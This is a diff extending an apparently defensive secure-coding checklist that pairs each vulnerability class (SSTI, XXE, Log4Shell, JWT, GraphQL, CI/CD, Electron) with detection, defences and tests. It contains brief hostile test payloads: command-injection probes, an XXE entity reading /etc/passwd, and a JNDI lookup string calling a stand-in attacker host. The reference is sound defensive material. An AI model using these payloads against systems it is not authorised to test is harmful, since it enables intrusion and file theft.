@@ -29,9 +29,38 @@ Each entry: **what it is → how to detect in code → how to defend → how to 
   passthrough; escape only as last resort.
 - **Test**: `; id`, `$(id)`, `| whoami`, newline injection.
 
-### A3. Template / expression injection (SSTI), LDAP, XPath, header/CRLF
-- **Defend**: don't render user input as templates; sandbox engines; encode for
-  the target grammar; strip CR/LF from header values.
+### A3. Template / expression injection (SSTI), SSJI, LDAP, XPath, header/CRLF
+- **SSTI**: user input rendered by a template engine (Jinja2, Twig, Freemarker,
+  Velocity, Handlebars) reaches code execution. **Test**: `{{7*7}}`, `${7*7}`,
+  `#{7*7}` reflected as `49`.
+- **SSJI (server-side JS injection)**: untrusted input into `eval`, `Function`,
+  `vm` module, or a JS template engine. **Defend**: never `eval` input; sandbox.
+- **LDAP / XPath**: parameterize/escape per the target grammar.
+- **Header / CRLF injection**: strip CR/LF from values placed into headers.
+- **General defend**: don't render user input as templates; sandbox engines;
+  encode for the target grammar.
+
+### A4. XXE (XML External Entity) injection
+- **What**: an XML parser resolves attacker-supplied external entities/DTDs →
+  file read, SSRF, or DoS (billion-laughs). Common in SAML, SOAP, SVG/`docx`/
+  `xlsx` upload parsing, and any XML ingest.
+- **Detect**: XML parsers with DTD/external-entity resolution enabled (Java
+  `DocumentBuilderFactory` defaults, .NET `XmlDocument`, PHP `libxml`, Python
+  `lxml`/`xml.etree` on untrusted input).
+- **Defend**: disable DTDs and external entity resolution
+  (`FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl`); use defusedxml in
+  Python; prefer JSON; cap entity expansion.
+- **Test**: a doc with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` referenced in
+  the body; check for file disclosure or outbound resolution.
+
+### A5. JNDI / Log4Shell-class injection
+- **What**: a logging/JNDI lookup evaluates attacker-controlled strings and
+  fetches a remote class (e.g. `${jndi:ldap://attacker/x}` in Log4j) → RCE.
+- **Detect**: vulnerable Log4j2 versions; any code logging user input through a
+  framework that performs interpolation/JNDI lookups.
+- **Defend**: patch logging libs; disable message lookups; restrict JNDI; egress
+  filtering. **Test**: log a benign `${jndi:ldap://127.0.0.1:1389/test}` against
+  your own listener and watch for the outbound resolution.
 
 ---
 
@@ -52,14 +81,29 @@ Each entry: **what it is → how to detect in code → how to defend → how to 
 
 - **Threats**: credential stuffing, brute force, weak password storage,
   session fixation, predictable tokens, missing MFA, account enumeration.
-- **Defend**: strong password hashing (argon2id/bcrypt/scrypt, never MD5/SHA1/
-  plain); rate limiting + lockout/backoff; MFA; rotate session IDs on login;
-  secure random tokens; generic auth errors (no enumeration); short-lived
-  sessions + idle timeout; `Secure`/`HttpOnly`/`SameSite` cookies.
+- **Defend**: strong password hashing — **argon2id** (≥19 MiB memory, ≥2
+  iterations, 1 thread), **bcrypt** (cost ≥10, 12 recommended), or **scrypt**
+  (N≥32768, r=8, p=1); never MD5/SHA1/plain. Follow the OWASP Password Storage
+  Cheat Sheet for current minimums. Plus: rate limiting + lockout/backoff; MFA;
+  rotate session IDs on login; secure random tokens; generic auth errors (no
+  enumeration); short-lived sessions + idle timeout; `Secure`/`HttpOnly`/
+  `SameSite` cookies.
 - **JWT/OAuth/OIDC pitfalls**: `alg:none`, weak HMAC secret, no `exp`/`aud`/`iss`
   checks, algorithm confusion (RS256→HS256), missing token revocation, leaking
   tokens in URLs, open redirect in OAuth callback, PKCE absent on public clients.
-- **Test**: login throttling, token tampering, expired/forged JWTs, fixation,
+  - **Header-injection variants**: `kid` injection (path traversal / SQLi via the
+    key-id), and `jku`/`x5u`/`jwk` pointing at an attacker-controlled key source —
+    **defend** by allowlisting key IDs/URLs and ignoring embedded keys.
+  - **Refresh tokens**: enforce single-use rotation and detect reuse; handle the
+    race where two concurrent refreshes present the same token.
+- **Account recovery flows** (own vuln class): password reset, email/phone
+  verification, OTP, account unlock. **Threats**: predictable/non-expiring/
+  reusable reset tokens, host-header injection in reset links, enumeration via
+  timing/response differences, no rate limit on OTP. **Defend**: high-entropy
+  single-use tokens with short expiry, bind to the account, ignore client host
+  header for links, generic responses, rate-limit, re-auth for sensitive changes.
+- **Test**: login throttling, token tampering, expired/forged JWTs, `kid`/`jku`
+  manipulation, refresh-token reuse, fixation, reset-token reuse/expiry,
   enumeration via timing/error differences.
 
 ---
@@ -114,7 +158,7 @@ Each entry: **what it is → how to detect in code → how to defend → how to 
 
 ---
 
-## G. Insecure Design, SSJI, Deserialization, File handling
+## G. Insecure Design, Deserialization, File handling, Business logic
 
 - **Insecure deserialization**: untrusted data into `pickle`, Java
   `ObjectInputStream`, PHP `unserialize`, unsafe YAML → RCE. **Defend**: avoid
@@ -126,6 +170,18 @@ Each entry: **what it is → how to detect in code → how to defend → how to 
 - **Insecure design**: missing rate limits, no abuse cases, trust boundaries
   unclear. **Defend**: threat-model early; secure-by-design patterns; abuse-case
   tests.
+- **Business-logic abuse** (Standard+): price/quantity tampering, negative
+  amounts, coupon/discount stacking, loyalty/referral fraud, workflow-step
+  skipping (e.g. hitting a post-payment endpoint directly), replaying steps.
+  **Defend**: enforce invariants & state machines server-side; re-validate
+  price/totals server-side; bind each step to prior steps; idempotency keys.
+  **Test**: map multi-step flows; try skipping/replaying steps and tampering
+  values.
+- **Race conditions / TOCTOU** (Standard+): concurrent requests to limited-use
+  resources (coupon/gift-card redeem, balance withdraw, one-per-account actions)
+  exploit check-then-act gaps. **Defend**: atomic operations, DB row locks /
+  unique constraints, idempotency, optimistic concurrency. **Test**: fire many
+  concurrent requests at a single-use action and check for double-spend.
 
 ---
 
@@ -139,15 +195,60 @@ Each entry: **what it is → how to detect in code → how to defend → how to 
   `rel=noopener`.
 - **Prototype pollution / client logic**: avoid unsafe merges of user objects.
 
+### H2. HTTP request smuggling & cache poisoning (Hardened+)
+- **Request smuggling**: `CL.TE`/`TE.CL` desync between a front-end proxy and
+  back-end origin lets an attacker prepend requests to others' connections.
+  **Defend**: consistent, strict parsing front-to-back; prefer HTTP/2 end-to-end;
+  reject ambiguous `Content-Length`/`Transfer-Encoding`. **Test**: known CL.TE/
+  TE.CL probes (carefully, against your own stack).
+- **Web cache poisoning / deception**: unkeyed inputs (headers) influence cached
+  responses served to others. **Defend**: include all influential inputs in the
+  cache key; don't reflect unkeyed headers; mark sensitive responses `no-store`.
+
+### H3. Subdomain takeover (Hardened+)
+- **What**: a dangling DNS record (CNAME) points to a deprovisioned cloud
+  service (S3/GitHub Pages/Heroku/Azure/Fastly) an attacker can claim.
+- **Defend**: inventory DNS; remove dangling records on decommission; monitor.
+- **Test**: enumerate subdomains; flag CNAMEs to unclaimed services.
+
+### H4. Webhook security (Hardened+)
+- **What**: inbound webhooks (Stripe/GitHub/Slack) accepted without verifying the
+  sender → spoofed events. Also replay.
+- **Defend**: verify HMAC signatures with the shared secret; check timestamp &
+  reject replays; allowlist source IPs where published. **Test**: send a forged
+  payload without/with a wrong signature; confirm rejection.
+
 ---
 
-## I. Server-Side Request Forgery already in F; API-specific (OWASP API Top 10)
+## I. API-Specific Threats (OWASP API Security Top 10 2023)
 
-- BOLA/BFLA (see D), excessive data exposure (return only needed fields),
-  mass assignment, lack of resources & rate limiting, improper inventory
-  (shadow/old API versions), unrestricted access to business flows.
+> For SSRF (API7:2023) see Section F1. The 2023 edition renumbered the list;
+> map findings to 2023 IDs (see `compliance-mapping.md`).
+
+- BOLA/BFLA (see D), broken object-property-level authorization (excessive data
+  exposure + mass assignment), unrestricted resource consumption (rate/quotas),
+  improper inventory (shadow/old API versions), unrestricted access to sensitive
+  business flows, unsafe consumption of upstream APIs.
 - **Defend**: per-object & per-function authz, response shaping/DTOs, quotas &
-  rate limits, API gateway, version inventory, schema validation (OpenAPI).
+  rate limits, API gateway, version inventory, schema validation (OpenAPI),
+  validate data from third-party APIs.
+
+### I-GraphQL. GraphQL-specific attacks
+- **Batching abuse**: many operations in one request to bypass per-request rate
+  limits. **Defend**: limit/forbid batching; rate-limit by cost not request count.
+- **Alias/field duplication**: requesting an expensive field thousands of times
+  via aliases to defeat naive complexity limits. **Defend**: cost analysis that
+  counts aliased duplicates.
+- **Query depth/complexity bombs**: deeply nested queries. **Defend**: depth +
+  complexity limits together (not just one).
+- **Introspection as OSINT**: enumerate the full schema. **Defend**: disable
+  introspection in prod.
+- **Resolver/field-level authz gaps**: auth enforced only at the operation, not
+  per resolver → BOLA. **Defend**: enforce authz in each resolver.
+- **Subscription auth bypass**: WebSocket subscriptions skip the auth applied to
+  queries/mutations. **Defend**: same authn/authz on subscriptions.
+- **Persisted-query bypass**: arbitrary queries accepted where only persisted
+  ones should be. **Defend**: enforce a persisted-query allowlist.
 
 ---
 
@@ -162,6 +263,22 @@ Each entry: **what it is → how to detect in code → how to defend → how to 
   postinstall scripts; minimal base images; least-privilege CI tokens; protect
   the pipeline (branch protection, required reviews, no secrets in logs).
 - **Test**: `npm/pip audit`, OSV scan, check for unpinned/`latest` deps.
+
+### J-CI/CD. Pipeline security (Hardened+)
+- **Threats**: `pull_request_target` (or equivalents) running untrusted fork code
+  with secrets; **script injection** via untrusted inputs interpolated into shell
+  steps (e.g. `${{ github.event.pull_request.title }}` inside `run:`); poisoned
+  pipeline execution via write access to workflow files; unpinned actions
+  (mutable tags/branches — see Section J); OIDC/cloud-token abuse; self-hosted
+  runner compromise; unsigned build artifacts.
+- **Defend**: use `pull_request` (not `pull_request_target`) for untrusted code;
+  never interpolate untrusted `github.event.*` into `run:` — pass via `env:` and
+  quote; pin actions to commit SHAs; least-privilege `GITHUB_TOKEN` permissions;
+  protect workflow files with branch protection/required review; short-lived OIDC
+  creds; ephemeral/isolated runners; sign & verify artifacts (Sigstore/cosign).
+- **Test**: grep workflows for `pull_request_target` + checkout of PR head;
+  `${{ github.event.* }}` used in `run:`; `@main`/`@master`/floating tags in
+  `uses:`.
 
 ---
 
@@ -210,14 +327,28 @@ Each entry: **what it is → how to detect in code → how to defend → how to 
   pinning; validate deep-link params & require auth; restrict exported
   components; obfuscate & strip debug; jailbreak/root awareness for high tiers;
   disable backups of sensitive data.
+- **React Native / Flutter / hybrid**: secrets in the JS bundle or Dart
+  snapshot are recoverable — keep them server-side; secure the JS↔native bridge
+  and custom native modules; sign over-the-air (CodePush/OTA) updates and verify
+  before applying; pin certs at the native layer; for WebView-based hybrids apply
+  the web XSS/CSP rules too.
 
-### Desktop (Electron/native)
-- **Threats**: `nodeIntegration` on with remote content (RCE via XSS),
-  `contextIsolation` off, loading remote URLs, insecure protocol handlers,
-  unsigned auto-update, secrets in app bundle, path traversal in IPC.
-- **Defend**: `contextIsolation:true`, `nodeIntegration:false`, sandbox,
-  strict CSP, validate all IPC messages, signed & verified auto-updates,
-  no remote code, principle of least privilege for file/OS access.
+### Desktop (Electron & native)
+- **Electron threats**: `nodeIntegration` on with remote content (RCE via XSS),
+  `contextIsolation` off, `webviewTag`/`enableRemoteModule` enabled, loading
+  remote URLs, insecure protocol handlers, unsigned auto-update, secrets in app
+  bundle, path traversal in IPC, unrestricted in-app navigation.
+- **Electron defend**: `contextIsolation:true`, `nodeIntegration:false`,
+  `sandbox:true`, `webviewTag:false`, `enableRemoteModule:false`,
+  `allowRunningInsecureContent:false`; strict CSP; validate all IPC messages;
+  restrict navigation via `will-navigate`/`setWindowOpenHandler`; signed &
+  verified auto-updates; no remote code; least privilege for file/OS access
+  (follow the official Electron Security Checklist).
+- **Native desktop (Win32/WPF, Cocoa/SwiftUI, Qt/GTK)**: insecure update
+  channels, missing code signing/notarization, DLL/dylib search-order hijack,
+  insecure IPC/named pipes, secrets in the bundle, over-broad entitlements.
+  **Defend**: code-sign & notarize; signed updates over TLS; validate IPC; least
+  privilege/entitlements; load libraries from trusted absolute paths.
 
 ---
 
